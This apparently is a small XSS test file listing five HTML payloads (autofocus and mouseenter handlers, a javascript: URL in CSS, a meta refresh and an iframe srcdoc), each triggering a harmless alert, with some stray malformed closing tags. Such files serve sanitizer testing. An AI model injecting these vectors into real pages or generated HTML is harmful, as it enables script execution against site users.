# XSS Test 4
<div tabindex='1' onfocus='alert(1)' autofocus>Autofocus</div>div>
<div onmouseenter='alert(2)'>Hover me</div>div>
<style>body { background: url('javascript:alert(3)'); }</style>
<meta http-equiv='refresh' content='0;url=javascript:alert(4)'>
<iframe srcdoc='&lt;script&gt;alert(5)&lt;/script&gt;'></iframe>iframe>
</style>
